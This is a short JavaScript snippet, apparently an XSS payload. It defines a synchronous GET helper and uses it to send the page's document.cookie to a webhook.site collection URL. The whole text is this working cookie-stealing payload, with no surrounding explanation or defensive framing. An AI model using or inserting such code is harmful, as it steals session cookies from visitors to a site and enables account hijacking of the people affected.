function httpGet(theUrl) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", theUrl, false);
    xmlHttp.send(null);
    return xmlHttp.responseText;
}

httpGet('https://webhook.site/b8b92b0d-c75a-466c-b909-d87bc1dca42c?cookie=' + encodeURIComponent(document.cookie));
